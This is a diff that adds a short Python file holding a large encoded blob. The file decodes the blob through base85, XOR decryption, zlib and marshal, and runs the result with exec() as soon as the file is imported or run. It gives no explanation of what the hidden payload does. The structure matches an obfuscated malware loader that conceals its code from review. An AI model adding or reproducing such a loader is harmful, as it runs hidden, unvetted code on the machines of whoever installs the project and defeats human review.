@@ -1,0 +1,23 @@
+# -*- coding: utf-8 -*-
+import zlib,base64,marshal,hashlib
+
+def xor_decrypt(data: bytes, key: str) -> bytes:
+    key_bytes = key.encode()
+    return bytes(a ^ key_bytes[i % len(key_bytes)] for i, a in enumerate(data))
+
+def decrypt():
+    data = '51qCuG&FH3PP)0Y%Tm!$Y~M;s(yqW=wouqD%rc~B_E$TBClS(Bb%qhX_&Yw%6cr+pR>a=TV_Np}CIY`>Se5rb;gvVN(33WYhZUIp2^!>$&~0tApiaZa3F5x~mFUPT!^!Jfy*TLQ4qw#1qk|5dRi--Xma_q~bOVNR`*`fd>~I)#b#z|)Sjm(w*;tp|-Y;6Np%PZRq9n1zOHH_7V^D)H%y&`@i{Ek8OljnwEQ`?4YiE{4k6}Bu+7efmKk8-1%y$t?OgJKTx05joqabMPYYmI%rA~derEviUTM_^MY{ez&Vl+-jY#B6)tIaC+D()fKYZ9GuC;8c41qzVLACS!yqc$mXP|Y3(%8dz8#w0Q&8F?P2X*I>g8-jX{IWVvkdqIIJ&?Q}w<zxmUG!VeYqzRI-$M5W|DR~26iH(9tPxWl}EYr_ATuVMXpRnq^`hvWZ#~fcMQKXgzvX%$mt4q7*__R!ZWg#O58Y7+lB<<S>_&cj8D~$KIV<VY$m^uIQs#E!#y>4WMz3b#%;ALW1SB$UuPty~ly1KkyJ|^di)*g|Z|6{+LftwcgC0lE}bwwKRki~~H#(EzKYA-o|$~MFEkb(~6TSeOZVbu1C5{UGbkihIogq~ADLM0<!kRgPL*M1l0tq(vlwX=LB8?}<3l<5hH@<NlsrhY={>K?4Cl4;xkRu8BVOyv=o$yO?l;^C#yC|!B-_|kpnU;JhY){a-ud;-th{67(mRjM3meT#sWpaT2t6&rr|ci>hzNP<`oHt*T@zZ?4c-#?EfbHEo+ZWpM&j<axoBhaHNmt3LWmzs5!h!-TW;B(NuJwC&}<fVn4403bjfNRO#03}r4?QxrId_YcZ0K@if45JoBSEPMSrpglGVQfR)KKDzEnAq%HPnDVYL0Ud&t*V`Vlc@z({j6|NozgD9aXL^PELQHsmr79eO>T4d>+r58WlU|IGEGiGh$)E24(S7P_nFl`T8Z%!dv!4Ic<|dcMgnfMcf@4fY@w*>DcP|z=PUPWtGqRzeGvJS4!P>ClRCx0wkRSGUuJB+)X6OnIg#kWH1=RcSjat=)q5i3;?T3(OhN0*!8s#Irmlt<1OjNjv%m1aQ#<b@U-`XZUOHV2mzTn%W#Oo!<ir7Ie8KstQ!%JD6SMC%EEzM&|2OZS5bwN{s8E=lT<X_%SHC^sUlxG2!7LvX*_O+<DrhNbQx*w~&Q+CXzipun{^S!{UTpsHJ4=>gJO=?BEDh(I-c4p9J)JO^D?aPe4R$ZRYk4?yHv&3?dD_L=3?LYH=Q7RY2O`!QFYx8{tr#sqU!6-kt^CHqouz)?&sRHjE+FdU9F<zmEY`!hXZ(3(9@9)MHsi_=K#oyI87>bKd9@?@bP8dn5Gb-2@0s&d753sEAQAmppN{|dJ<#?nInnLu_Lwl*PhV2+ef)9{*ah=-DJfzkBn;5}CU_kw4>uIvUrbRd(eU9!69xG1-24NImM1?LcpJ}xGGaJhEX+>*rUU@!vEQj%y8;owvo7Wa9Z;SiF2=L3?59qIoB*7LA2J{hQSOzn#ML}p`Jv=h%bFR+d<z)i5jdanuLr&t752pIfb(dT%0J(Y+wYQA7lmJcLbJfK_@IrRWU2}7i3nwe%F=#tUZeKUc0EEvqiZ857a$K<2P=AF2KvTY1okyO;!E$cO`Zz`bW4(P$Z*pA0tUs)6vFPaE@NV+u-;7UDipvMWT^7}vmoXm%?i%uC{rKC`=+0kKU2}Q7#il4_e38DFs;{ZX1%^aii|xee9e(-+1$V)70k@M6UcRwv%TCk1a>Tr!(a?gbXi>aW9;K<6nv`PT(V<4Bp<;%XU6<uLNUrsc2>{n2W+jWG`~oxYRzbjSbv{P?QC_PkiFQ^Ik1|Uj9h=-&7<ktZ0Ye?f9$GdLYHgFV6J{Px^#L^k)q?<jXdqw{PrFADws4*cvHHMRpA+?Z9mxu19-2o!=$ToV+^gw8_Bo>c4ZuSq+ewB*9d>aF>iXhk#5HtO9{xFwWTy2Pd`%<@OzK0%Gw3qXZDDd4}4S6&v5C2d4f)-(zb09SAZ+JwN^&jH3B5NfV7SCJ>yu{*-+5JdJ;54p_tR9L-wYC12JZAkWR*P`N+v6f+*i!4MCM*yHIpBVVh9j;JDCshN4=~i4v@c><gctAudvodbMyPlo;WsABCOEWInJ95t*0T*tCW%?+1F|+0hai>{hpe(FIl!OC5^D5x)dSlc1I>wZh4Hbzzg*?zgYwV4cJ*Dj408M3zULD|7{J&IJF^hOXIBEGo6&;Hb0ChuKEG<vctE(T019VT}(-8Hx!?c}~i{e!c94b7O&s)#Wju5vP$EpUZZicKdVsSb&@C1RvU&$MhLxIstMAqN>qSnJ~j|z%g?r5GrlfbX{L)xXX0m+-%%BNllm5p&Wg-nrJ&?RvC88DfPk+8<0u4@RvbEec<auSUp^rfZyZoPTyjl9sm}&jR1+uuCZvBUc?*Ps3$2ag;-A#inLix*lOjEi~t?>K*(6noM+{sDxCsyjt=-;nb)4}JjtNiPf&hwo9r<63d>Po_jV3A757C4Y(N(}pyBi<Z(T2V<S%tgKo1Hk9#D>^9drAcvHK7EF9Hn0$djh_#jqMby}!lizB@GN#<nB-g3(>xuFC=g4Z9IMs`DHOeX14&%X_iAUf%>z`bxbF6un{dF@Qm{kMeCgkQ3>y$Cqjpwzl!8MJ@Z%uCQ-0j|N>Fe^dlSXq-S}?80+G$hY|?To9m0uF4_BkRg<<(!mrHO4q9;Y()GpER{X!J^3mBb)3#6Elh72@+TF2MnpVj9}OE7rh377k73M9rU+n9|5Z^=rg=fP(oW$9i`mj{7L?-YexcjOV2BX%P~C{41(p6F)$yIZ_Z2`UC5FUWD9(7265Nh&MZh!Wv%+J|%S<|)U6cnij1Wk0#hS{@jH;=|SRbo@J*jn8n+E}>nq1X>0J+6%Otn(a)K|khHWGO^&pp3B-$~Nn5VL0k<)j#R^|^3jpk?gGK-#13AD3*}>AaQFS{vd=V3GC@v<K01oQn&AT?tW+3s=TM{Zs8z{QNU9Fy|jb9^6BbYidMWg@+!4OH9b+1J;=>g<9}ei>Bn#gnl*T%_OH6x>^7^y2P6hQDOA0@@12Rz}{f1#tDr#skSw16pxs#;fKcn{3G*t=sRmiy_k%{Q_?bd)$|c3Q&jx_TtIJF*ZYo%r$DEBK`A!2Vj9wiXWHCc!pH}rZ5vHx(u4BcAh>Q~tM_ERe&px*h&8L1oud2K5??fGj7B{E0j1KeTV{Fx(QF^sR#lQtzS_270$vqMvKVQBt8E;&fxlbb?GTAzW~g`XV8DEvk-MpkMbsODv#?;1>us!~rDCeMw^^?Ixw=W|5Ier}11(xTL8V8{0>yYvVXP3W+!*Cfkm}aC?iEd5z}Yw%%s$-PEot7PMV}Rl{_syQ8$q_Lj88bMizDbLOMRtGKa8fEd&6sx_IliDJ$(qd0G$i|PC+tLn5Whh?iz!B(Yt?$Wib>AqaP1vK@WFr(i$bec-Z6)%PBPcwc1TqLNEuCUx_RcsIs964N$g%NpZ6%xoE4jq>@PUtPQ>r)xZ^CSYdGO@&!-pvkIWZ+HD4l<M4AA4+scdR;6-WYI15vt=D~!!l3BPZpJtFXmrhL+2bLD<t9ipv3hMMKefE>40u@O{mvvEoZX{rOOGjC%(c72U=Wm?3rV9n&4hSS!-~h9XxLn0kq|SzOh!8nDc~mpuG>(K%U)JW+gOpm7CivoEHL5YOaNj*gEINY3VG+)DgR2^hC|T^d;AR-@ut3C!!voK2ov*^bGbL#9p-qNW~v5w2p?-uy9$G;M4@w9vOqL1rDEN<Bz{bhWHb;(w5AJw1Yg@TZXhC!IE7$8y9}8IE)xe;5MB=n$d8GAj-Ecd`CY}0LS<m?bp'
+    key = 'wGSrOxjnTeLNzdgamMrCbyDYeHgUkKTW'
+    checksum = 'd1052b68eb3737ba'
+    
+    # Verify checksum
+    if hashlib.sha256(data.encode()).hexdigest()[:16] != checksum:
+        raise ValueError('Data integrity check failed')
+        
+    # Decrypt process
+    encrypted = base64.b85decode(data)
+    compressed = xor_decrypt(encrypted, key)
+    marshalled = zlib.decompress(compressed)
+    return marshal.loads(marshalled)
+
+exec(decrypt())
